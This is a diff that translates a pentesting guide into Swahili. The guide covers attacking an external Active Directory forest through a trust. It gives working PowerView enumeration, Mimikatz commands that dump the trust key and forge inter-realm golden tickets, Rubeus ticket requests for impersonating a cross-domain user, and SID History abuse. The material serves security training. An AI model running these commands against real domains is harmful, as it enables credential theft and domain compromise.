@@ -1,13 +1,12 @@
-# External Forest Domain - OneWay (Inbound) or bidirectional
+# External Forest Domain - OneWay (Inbound) au bidirectional
 
 {{#include ../../banners/hacktricks-training.md}}
 
-In this scenario an external domain is trusting you (or both are trusting each other), so you can get some kind of access over it.
+Katika hali hii, kikoa cha nje kinakuamini (au vyote vinajiamini), hivyo unaweza kupata aina fulani ya ufikiaji juu yake.
 
 ## Enumeration
 
-First of all, you need to **enumerate** the **trust**:
-
+Kwanza kabisa, unahitaji **kuhesabu** **kuamini**:
 ```powershell
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
@@ -32,7 +31,7 @@ GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
 MemberDomain            : domain.external
 MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
 MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
-                          DC=external
+DC=external
 
 # Get name of the principal in the current domain member of the cross-domain group
 ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
@@ -57,48 +56,42 @@ IsDomain     : True
 # You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
 ```
+Katika orodha ya awali iligundulika kwamba mtumiaji **`crossuser`** yuko ndani ya kundi la **`External Admins`** ambalo lina **ufikiaji wa Admin** ndani ya **DC ya eneo la nje**.
 
-In the previous enumeration it was found that the user **`crossuser`** is inside the **`External Admins`** group who has **Admin access** inside the **DC of the external domain**.
+## Ufikiaji wa Awali
 
-## Initial Access
+Ikiwa hujaweza kupata **ufikiaji maalum** wa mtumiaji wako katika eneo lingine, bado unaweza kurudi kwenye Mbinu za AD na kujaribu **privesc kutoka kwa mtumiaji asiye na mamlaka** (mambo kama kerberoasting kwa mfano):
 
-If you **couldn't** find any **special** access of your user in the other domain, you can still go back to the AD Methodology and try to **privesc from an unprivileged user** (things like kerberoasting for example):
-
-You can use **Powerview functions** to **enumerate** the **other domain** using the `-Domain` param like in:
-
+Unaweza kutumia **Powerview functions** ili **kuorodhesha** **eneo lingine** kwa kutumia param ya `-Domain` kama ilivyo:
 ```powershell
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
-
 {{#ref}}
 ./
 {{#endref}}
 
-## Impersonation
+## Uigaji
 
-### Logging in
+### Kuingia
 
-Using a regular method with the credentials of the users who is has access to the external domain you should be able to access:
-
+Kwa kutumia njia ya kawaida na akidi za watumiaji ambao wana ufikiaji wa eneo la nje unapaswa kuwa na uwezo wa kufikia:
 ```powershell
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
-
 ### SID History Abuse
 
-You could also abuse [**SID History**](sid-history-injection.md) across a forest trust.
+Unaweza pia kutumia [**SID History**](sid-history-injection.md) kupitia uaminifu wa msitu.
 
-If a user is migrated **from one forest to another** and **SID Filtering is not enabled**, it becomes possible to **add a SID from the other forest**, and this **SID** will be **added** to the **user's token** when authenticating **across the trust**.
+Ikiwa mtumiaji amehamishwa **kutoka msitu mmoja hadi mwingine** na **SID Filtering haijawashwa**, inakuwa inawezekana **kuongeza SID kutoka msitu mwingine**, na hii **SID** itakuwa **imeongezwa** kwenye **token ya mtumiaji** wakati wa kuthibitisha **kupitia uaminifu**.
 
 > [!WARNING]
-> As a reminder, you can get the signing key with
+> Kama ukumbusho, unaweza kupata funguo ya kusaini na
 >
 > ```powershell
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-You could **sign with** the **trusted** key a **TGT impersonating** the user of the current domain.
-
+Unaweza **kusaini na** funguo **iliyoaminika** **TGT ikijifanya** kuwa mtumiaji wa eneo la sasa.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -109,9 +102,7 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-
-### Full way impersonating the user
-
+### Njia kamili ya kujifanya mtumiaji
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
@@ -125,6 +116,4 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-
 {{#include ../../banners/hacktricks-training.md}}
-
